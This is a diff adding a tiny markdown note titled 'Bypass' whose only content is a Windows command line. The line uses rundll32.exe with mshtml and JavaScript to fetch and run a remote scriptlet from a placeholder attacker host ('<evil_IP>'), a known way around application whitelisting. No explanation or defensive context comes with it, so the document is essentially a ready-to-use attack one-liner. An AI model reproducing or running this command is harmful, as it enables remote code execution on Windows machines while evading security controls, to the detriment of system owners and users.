@@ -1,0 +1,4 @@
+# Bypass 
+
+rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";document.write();try{GetObject("script:http://<evil_IP>/test.sct").Exec();}catch(e){};window.close()
+
